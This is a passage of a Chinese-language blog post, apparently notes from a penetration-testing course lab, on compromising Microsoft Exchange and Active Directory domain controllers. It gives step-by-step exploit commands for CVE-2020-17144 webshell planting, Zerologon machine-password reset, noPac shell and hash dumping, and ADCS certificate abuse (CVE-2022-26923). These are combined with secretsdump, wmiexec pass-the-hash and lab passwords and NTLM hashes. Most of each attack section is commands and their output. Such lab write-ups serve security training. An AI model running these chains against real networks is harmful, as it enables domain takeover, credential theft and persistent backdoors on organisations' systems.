<p>拿来重放 攻击其他主机</p>
<p>重放失败则拿来暴力破解明文！</p>
<h3 id="Exchange服务"><a href="#Exchange服务" class="headerlink" title="Exchange服务"></a>Exchange服务</h3><p>Exchange Server是微软公司的一套电子邮件服务组件，是个消息与协作系统。内网中，拿下邮件系统会对接下来的目标寻找起到关键作用。目前exchange有Exchange Server2010、2013、2016以及2019等多个版本。</p>
<p>信息收集，服务发现：</p>
<p>在最初，我们需要进行信息收集，通过端口扫描、SPN探测等手法发现Exchange服务。</p>
<p>1.端口扫描</p>
<p>exchange会对外暴露接口如OWA，ECP等，会暴露在80端口，而且25&#x2F;587&#x2F;2525等端口上会有SMTP服务，所以可以通过一些端口特征来定位Exchange</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517155704342.png" alt="image-20250517155704342"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250304155829645.png" alt="image-20250304155829645"></p>
<p>2.SPN扫描</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell setspn -T 0day.org -q */*</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517155715834.png" alt="image-20250517155715834"></p>
<p>3.脚本探针</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Exchange_GetVersion_MatchVul.py 192.168.3.142</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250304163031643.png" alt="image-20250304163031643"></p>
<p>成功探测到以后，我们要建立一下socks代理，让本机能够访问到3.142。</p>
<p>我们用谷歌啥的不可以，试了下火狐渗透版，高级选项里添加一个例外即可成功。</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250304160958061.png" alt="image-20250304160958061"></p>
<p><strong>接下来想要知道Exchange版本可以用上面脚本探针的方法，也可以查看源代码！！</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250304163310538.png" alt="image-20250304163310538"></p>
<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/exchange/new-features/build-numbers-and-release-dates?view=exchserver-2019">https://learn.microsoft.com/zh-cn/exchange/new-features/build-numbers-and-release-dates?view=exchserver-2019</a></p>
<p><strong>本身的漏洞</strong></p>
<p>攻击者寻找并利用Exchange服务器中存在的漏洞。这些漏洞可能是操作系统、Exchange软件或其他组件的安全漏洞。</p>
<p><strong>钓鱼攻击</strong></p>
<p>攻击者使用欺骗性手段来诱使用户提供其Exchange凭据或敏感信息。他们可能发送伪造成合法邮件或网站的钓鱼电子邮件，诱使用户点击恶意链接或下载附件。</p>
<p><strong>暴力破解</strong></p>
<p>攻击者使用暴力破解工具来尝试破解用户的密码。他们可能使用常见密码列表、字典文件或使用强大的计算资源进行暴力攻击。一旦成功破解密码，攻击者可以获得合法访问Exchange服务器的权限。</p>
<h4 id="无凭据"><a href="#无凭据" class="headerlink" title="无凭据"></a>无凭据</h4><h5 id="1-暴力破解"><a href="#1-暴力破解" class="headerlink" title="1.暴力破解"></a>1.暴力破解</h5><p>这里我们用bp浏览器抓到一个登陆包</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250304162234612.png" alt="image-20250304162234612"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250304162417385.png" alt="image-20250304162417385"></p>
<h5 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h5><p>在没有凭据的情况下，攻击者可能会尝试利用Proxylogon、Proxyshell等攻击链对Exchange实施攻击，如果攻击成功，能够拿到Exchange的system权限。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/horizon3ai/proxyshell">https://github.com/horizon3ai/proxyshell</a></p>
<blockquote>
<p>CVE-2021-34473 Microsoft Exchange ACL绕过漏洞</p>
<p>CVE-2021-34523 Microsoft Exchange权限提升漏洞</p>
<p>CVE-2021-31207 Microsoft Exchange授权任意文件写入漏洞。</p>
</blockquote>
<p>打新版本的，旧版本打不了。。我本地没有环境，就不演示了，反正都是一个道理，下面有写。</p>
<h4 id="有凭据"><a href="#有凭据" class="headerlink" title="有凭据"></a>有凭据</h4><h5 id="1-漏洞利用"><a href="#1-漏洞利用" class="headerlink" title="1.漏洞利用"></a>1.漏洞利用</h5><p>确定内核版本-筛选Server版本-确定漏洞对应关系-选择漏洞</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaozi/p/14481595.html">https://www.cnblogs.com/xiaozi/p/14481595.html</a></p>
<p><a target="_blank" rel="noopener" href="https://forum.butian.net/index.php/share/1837">https://forum.butian.net/index.php/share/1837</a></p>
<p>根据我们之前获取的版本，Exchange Server 2010 SP3</p>
<h6 id="CVE-2020-17144"><a href="#CVE-2020-17144" class="headerlink" title="CVE-2020-17144"></a>CVE-2020-17144</h6><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517155755155.png" alt="image-20250517155755155"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Airboi/CVE-2020-17144-EXP</span><br><span class="line">https://github.com/zcgonvh/CVE-2020-17144</span><br></pre></td></tr></table></figure>

<p>这里说到需要一个普通账号，那就是账号密码嘛，我们通过cs提权system才能用mimikatz抓取hash</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250304165046974.png" alt="image-20250304165046974"></p>
<p>接下来hashcat即可。</p>
<p>说实话直接抓取明文密码也可以的！</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517155818136.png" alt="image-20250517155818136"></p>
<p>得到账号jack，密码admin!@#45</p>
<p>接下来关注的是exp了</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250304170241423.png" alt="image-20250304170241423"></p>
<p>data其实就是webshell的内容，我们随便改一下就行。</p>
<p>看看exe的用法</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250304170418850.png" alt="image-20250304170418850"></p>
<p>后面接上域名和username和password</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250304170449199.png" alt="image-20250304170449199"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250304171606612.png" alt="image-20250304171606612"></p>
<p>出现了一些问题。。可能是域名的问题，本地hosts没有设置！</p>
<p>后来我用ip试了一下，发现可以！</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250305100705829.png" alt="image-20250305100705829"></p>
<p>然后我们手动重启一下Exchange服务器。</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250305102805517.png" alt="image-20250305102805517"></p>
<p>确实多出了这个Services.aspx</p>
<p>这就可以实现写后门从而获得webshell权限啦！</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517155901095.png" alt="image-20250517155901095"></p>
<h6 id="CVE-2020-0688"><a href="#CVE-2020-0688" class="headerlink" title="CVE-2020-0688"></a>CVE-2020-0688</h6><p>利用条件：Exchange Server 2010 SP3&#x2F;2013&#x2F;2016&#x2F;2019，普通账号。</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250305104742352.png" alt="image-20250305104742352"></p>
<p>这里要我们自行执行一下ysoserial.exe那条命令，将结果input</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250305105200419.png" alt="image-20250305105200419"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250305105445905.png" alt="image-20250305105445905"></p>
<p>但是，可悲的事情发生了</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250305105505182.png" alt="image-20250305105505182"></p>
<p>没有出现calc的进程？小迪表示这个版本不存在漏洞。。</p>
<p>但是这里我们可以用给的另一个rootkit.org域环境来进行实验，exchange2013版本的。</p>
<h5 id="2-钓鱼攻击"><a href="#2-钓鱼攻击" class="headerlink" title="2.钓鱼攻击"></a>2.钓鱼攻击</h5><p>-利用附件（免杀后门）发给域内其他用户</p>
<p>-利用网站配合监听实现获取ntlm hash(票据)</p>
<h3 id="域控系统提权-漏洞利用"><a href="#域控系统提权-漏洞利用" class="headerlink" title="域控系统提权-漏洞利用"></a>域控系统提权-漏洞利用</h3><h4 id="CVE-2020-1472"><a href="#CVE-2020-1472" class="headerlink" title="CVE-2020-1472"></a>CVE-2020-1472</h4><p>CVE-2020-1472是一个windows域控中最严重的远程权限提升漏洞，攻击者通过NetLogon，建立与域控间易受攻击的安全通道时，可利用此漏洞获取域管访问权限</p>
<blockquote>
<p>Windows Server 2008 R2 for x64-based Systems Service Pack 1</p>
<p>Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)</p>
<p>Windows Server 2012</p>
<p>Windows Server 2012 (Server Core installation)</p>
<p>Windows Server 2012 R2</p>
<p>Windows Server 2012 R2 (Server Core installation)</p>
<p>Windows Server 2016</p>
<p>Windows Server 2016 (Server Core installation)</p>
<p>Windows Server 2019</p>
<p>Windows Server 2019 (Server Core installation)</p>
<p>Windows Server, version 1903 (Server Core installation)</p>
<p>Windows Server, version 1909 (Server Core installation)</p>
<p>Windows Server, version 2004 (Server Core installation)</p>
</blockquote>
<p>利用条件：只需要一个域内机器的权限即可。一般就是web主机，或者我们通过钓鱼手法获取的权限，同时不需要账号密码，只要有权限就可以。（不管是普通用户权限还是管理员权限）</p>
<p>利用如下：</p>
<p>1.首先要获取域控的计算机名：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain controllers&quot; /domain</span><br><span class="line">net time /domain</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517155944656.png" alt="image-20250517155944656"></p>
<p>2.Socks代理后：</p>
<p>修改hosts绑定域名和ip</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517155952305.png" alt="image-20250517155952305"></p>
<p>3.连接DC，清空凭证</p>
<p><a target="_blank" rel="noopener" href="https://github.com/dirkjanm/CVE-2020-1472">https://github.com/dirkjanm/CVE-2020-1472</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python cve-2020-1472-exploit.py OWA2010CN-God 192.168.3.21</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250315185656091.png" alt="image-20250315185656091"></p>
<p>4.获取域内HASH</p>
<p>这里使用的是impacket的套件，通过-no-pass导出域内hash，这里可能有个疑问，既然是清空凭证了，为什么不能直接无密码登录。。这里的wmiexec.py就是要密码的，不知道该咋说。。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py &quot;god.org/OWA2010CN-God$@192.168.3.21&quot; -no-pass</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250315190321867.png" alt="image-20250315190321867"></p>
<p>出现了一大堆。所有dc上保存的用户的hash值。</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250315190522300.png" alt="image-20250315190522300"></p>
<p>5.连接域控PTH，通过wmi进行hash传递</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python wmiexec.py -hashes :ccef208c6485269c20db2cad21734fe7 god/administra</span><br><span class="line">tor@192.168.3.21</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250315191004002.png" alt="image-20250315191004002"></p>
<p>直接拿下了dc权限！</p>
<p>6、后续恢复密码：</p>
<p>为了防止脱域，通过将SAM系统等文件导出到本地，以获取此前在域控制机器上保存的hash值，然后用于进行系统的恢复操作。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/risksense/zerologon">https://github.com/risksense/zerologon</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">python wmiexec.py -hashes :ccef208c6485269c20db2cad21734fe7 god/administra</span><br><span class="line">tor@192.168.3.21</span><br><span class="line"></span><br><span class="line">reg save HKLM\SYSTEM system.save</span><br><span class="line">reg save HKLM\SAM sam.save</span><br><span class="line">reg save HKLM\SECURITY security.save</span><br><span class="line"></span><br><span class="line">lget system.save</span><br><span class="line">lget sam.save</span><br><span class="line">lget security.save</span><br><span class="line"></span><br><span class="line">del /f system.save</span><br><span class="line">del /f sam.save</span><br><span class="line">del /f security.save</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517160027481.png" alt="image-20250517160027481"></p>
<p>通过导出sam.save、security.save和system.save等文件，获取域控制机器上保存的NTLM Hash值，并将其用于密码恢复操作。</p>
<p>破解sam文件查看过去的机器密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py -sam sam.save -system system.save -security security.save LOCAL</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250315204228499.png" alt="image-20250315204228499"></p>
<p>接下来重制密码域控的机器密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python reinstall_original_pw.py OWA2010CN-God$ 192.168.3.21 4a70cc01733be14c813e5f7a06d5a7fa</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250315204822390.png" alt="image-20250315204822390"></p>
<p>接下来查看一下密码是否恢复成功了：（下面四种方法都是可以的，上面两种是用原来的密码来试，成功就行；下面两种是用空密码来试，不成功就行）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py god/administrator:Admin12345@192.168.3.21 -just-dc-user OWA2010CN-God$</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21 -just-dc-user OWA2010CN-God$</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py god/OWA2010CN-God$@192.168.3.21 -just-dc -no-pass</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py god/OWA2010CN-God$@192.168.3.21    -no-pass</span><br></pre></td></tr></table></figure>



<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250315210205327.png" alt="image-20250315210205327"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250315210148344.png" alt="image-20250315210148344"></p>
<p>成功恢复啦！</p>
<h4 id="CVE-2021-42287"><a href="#CVE-2021-42287" class="headerlink" title="CVE-2021-42287"></a>CVE-2021-42287</h4><p>CVE-2021-42278，机器账户的名字一般来说应该以$结尾，但AD没有对域内机器账户名做验证。CVE-2021-42287，与上述漏洞配合使用，创建与DC机器账户名字相同的机器账户（不以$结尾），账户请求一个TGT后，更名账户，然后通过S4U2self申请TGS Ticket，接着DC在TGS_REP阶段，这个账户不存在的时候，DC会使用自己的密钥加密TGS Ticket，提供一个属于该账户的PAC，然后我们就得到了一个高权限ST。</p>
<p>前提条件：一个域内普通账号（此处是需要账号和明文密码的）</p>
<p>影响版本：Windows基本全系列</p>
<p>工具如下：</p>
<p>noPac-python版本</p>
<p><a target="_blank" rel="noopener" href="https://github.com/Ridter/noPac">https://github.com/Ridter/noPac</a></p>
<p>首先扫描，查看是否存在该漏洞。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python scanner.py -use-ldap &quot;god.org/webadmin:admin!@#45&quot; -dc-ip 192.168.3.21</span><br></pre></td></tr></table></figure>

<p>既然需要明文密码，我们首先需要获得的是明文密码，那么前提就是提权，获取system权限。然后用mimikatz抓明文密码。</p>
<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517160107826.png" alt="image-20250517160107826" style="zoom:80%;" />

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250318091302123.png" alt="image-20250318091302123"></p>
<p>发现Got TGT，成功了可以进行漏洞利用。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python noPac.py -use-ldap &quot;god.org/webadmin:admin!@#45&quot; -dc-ip 192.168.3.21 -shell</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250318091453174.png" alt="image-20250318091453174"></p>
<p>直接反弹了一个cmd。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python noPac.py -use-ldap &quot;god.org/webadmin:admin!@#45&quot; -dc-ip 192.168.3.21 -dump</span><br></pre></td></tr></table></figure>

<p>以上命令可以导出票据文件和域中存储的hash值密码。（所有用户都有！）</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250318091809710.png" alt="image-20250318091809710"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517160139975.png" alt="image-20250517160139975"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517160152400.png" alt="image-20250517160152400"></p>
<h4 id="CVE-2022-26923（ADCS攻击）"><a href="#CVE-2022-26923（ADCS攻击）" class="headerlink" title="CVE-2022-26923（ADCS攻击）"></a>CVE-2022-26923（ADCS攻击）</h4><p>这里先浅尝辄止，ADCS是挺复杂的，这里只说一种。</p>
<p>Active Directory 证书服务 (AD CS) 提供公钥基础结构 (PKI) 功能，该功能支持 Windows 域上的身份和其他安全功能（即文件加密、电子邮件加密和网络流量加密）。它可以为组织的内部使用创建、验证和撤销公钥证书。</p>
<p>根据 Microsoft 的说法，AD CS 是一个服务器角色，它允许构建公钥基础结构 (PKI) 并为组织提供公钥加密、数字证书和数字签名功能”。</p>
<p>AD CS Windows Server 角色是实施 PKI 解决方案。</p>
<p>AD CS 提供所有与 PKI 相关的组件作为角色服务。每个角色服务负责证书基础架构的特定部分，同时协同工作以形成完整的解决方案。</p>
<p>证书中包含的信息将一个主题身份与一个公共&#x2F;私人密钥对结合起来。之后应用程序在操作时使用该密钥对作为该用户的身份证明。</p>
<p>证书申请流程大致过程：</p>
<blockquote>
<p>1.客户端产生密钥对</p>
<p>2.客户端发送证书请求(CSR)给企业CA服务器</p>
<p>3.CA检查CSR中的内容，判断是否许可获得证书</p>
<p>4.CA通过许可，下发使用CA私钥签名的证书</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/17230">https://xz.aliyun.com/news/17230</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.noah.360.net/active-directory-certificate-services-attack-and-exploit/">https://blog.noah.360.net/active-directory-certificate-services-attack-and-exploit/</a></p>
<p>当Windows系统的Active Directory证书服务（CS）在域上运行时，由于机器账号中的dNSHostName属性不具有唯一性，域中普通用户可以将其更改为高权限的域控机器账号属性，然后从Active Directory证书服务中获取域控机器账户的证书，导致域中普通用户权限提升为域管理员权限。</p>
<p>影响：Win8.1、Win10、Win11、WinServer2012R2、WinServer2016、WinServer2019、WinServer2022等版本</p>
<p>前提条件：</p>
<p>1、一个域内普通账号（此处是需要账号和明文密码的）</p>
<p>2、域内存在证书服务器</p>
<p>这里先来看看什么是证书服务器，先看我们的god.org，证书服务是没有安装的！那么就不存在该利用条件。</p>
<p> <img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517160204583.png" alt="image-20250517160204583"></p>
<p>因此我们这里要用另外的域环境xiaodi.lab</p>
<p>dc的密码为admin!@#45</p>
<p>web的密码为Pass123</p>
<p>我们上dc看看是否存在证书服务器。</p>
<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517160213927.png" alt="image-20250517160213927" style="zoom:80%;" />

<p>工具如下：<a target="_blank" rel="noopener" href="https://github.com/ly4k/Certipy">https://github.com/ly4k/Certipy</a></p>
<p>首先在cs中获取CA结构名和计算机名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell certutil</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517160225638.png" alt="image-20250517160225638"></p>
<p>ping一下计算机名我们就可以知道dc的ip：192.168.3.111</p>
<p>这里提权我用插件提不上去，算了就当知道密码吧，用脚本提权感觉挺麻烦的，算了。</p>
<p>我们往hosts文件中加三条</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250319160310425.png" alt="image-20250319160310425"></p>
<p>然后建立一个socks节点。</p>
<p>上面我有windows发现实验失败，一直连接不上，不知道为什么，我改用kali就可以了。</p>
<p>首先开始漏洞利用：</p>
<p>1.这里我们先进行漏洞的探测 查看存在漏洞的模板</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 certipy-ad find -u test@xiaodi.lab -p Pass123 -dc-ip 192.168.3.111 -vulnerable</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250319163727564.png" alt="image-20250319163727564"></p>
<p>2.申请低权限用户证书：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 certipy-ad req -u test@xiaodi.lab -p Pass123 -dc-ip 192.168.3.111 -ca xiaodi-DC-CA -template User -debug</span><br></pre></td></tr></table></figure>

<p>该命令使用 <code>Certipy-AD</code> 请求活动目录证书服务（AD CS）的用户证书，并输出详细的调试信息。</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250319164028915.png" alt="image-20250319164028915"></p>
<p>这样就生成了一个用户证书</p>
<p>3.检测证书</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 certipy-ad auth -pfx test.pfx -dc-ip 192.168.3.111</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250319164215074.png" alt="image-20250319164215074"></p>
<p>得到了一个hash值，那么就没问题了！</p>
<p>4、创建一个机器账户：</p>
<p>这里其实就是通过普通的域用户来创建域机器用户，kali的impacket-addcomputer也创建</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 bloodyAD.py -d xiaodi.lab -u test -p &#x27;Pass123&#x27; --host 192.168.3.111 addComputer pwnmachine &#x27;meteorkai&#x27;</span><br></pre></td></tr></table></figure>

<p>在创建之前，我们先看看dc上存在哪些用户</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517160301903.png" alt="image-20250517160301903"></p>
<p>只存在一个web用户，接下来我们创建一个机器用户。</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250319170621358.png" alt="image-20250319170621358"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517160331023.png" alt="image-20250517160331023"></p>
<p>成功添加一个机器用户。</p>
<p>5、设置机器账户属性(dNSHostName和DC一致)：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 bloodyAD.py -d xiaodi.lab -u test -p &#x27;Pass123&#x27; --host 192.168.3.111 setAttribute &#x27;CN=pwnmachine,CN=Computers,DC=xiaodi,DC=lab&#x27; dNSHostName &#x27;[&quot;dc.xiaodi.lab&quot;]&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250319165342247.png" alt="image-20250319165342247"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 bloodyAD.py -d xiaodi.lab -u test -p &#x27;Pass123&#x27; --host 192.168.3.111 getObjectAttributes &#x27;CN=pwnmachine,CN=Computers,DC=xiaodi,DC=lab&#x27; DNSHOSTName</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250319195542309.png" alt="image-20250319195542309"></p>
<p>6、再次申请证书：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 certipy-ad req -username &#x27;pwnmachine$@xiaodi.lab&#x27; -password &#x27;meteorkai&#x27; -ca xiaodi-DC-CA -template Machine -debug</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250319171859475.png" alt="image-20250319171859475"></p>
<p>7、检测证书：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 certipy-ad auth -pfx dc.pfx -dc-ip 192.168.3.111</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250319172000855.png" alt="image-20250319172000855"></p>
<p>生成了域控dc的证书<br> 再使用证书进行验证获取ntlm</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aad3b435b51404eeaad3b435b51404ee:a6f52335a19440b7faf3117242fec9a5</span><br></pre></td></tr></table></figure>



<p>8、导出HASH：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 secretsdump.py &#x27;xiaodi.lab/dc$@dc.xiaodi.lab&#x27; -hashes :a6f52335a19440b7faf3117242fec9a5</span><br></pre></td></tr></table></figure>

<p>到此拿到了域控机器账户的ntlm，接下来就可以使用域控机器账户的ntlm做其他的操作了。</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250319174931832.png" alt="image-20250319174931832"></p>
<p>但是这里我导出不了。。不知道为啥。。。改天再复现吧，道理是一样的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 secretsdump.py -hashes :a6f52335a19440b7faf3117242fec9a5 &#x27;xiaodi.lab/dc$@dc.xiaodi.lab&#x27; -no-pass -just-dc</span><br></pre></td></tr></table></figure>



<p>复现成功！</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517160423519.png" alt="image-20250517160423519"></p>
<p>这里当时卡了挺久的！问了AI才发现问题！</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517160433009.png" alt="image-20250517160433009"></p>
<p>接下来我们对hash进行利用即可！</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:518b98ad4178a53695dc997aa02d455c</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 wmiexec.py -hashes :518b98ad4178a53695dc997aa02d455c xiaodi.lab/administrator@192.168.3.111 &quot;whoami&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517160442218.png" alt="image-20250517160442218"></p>
<p>直接拿下！</p>
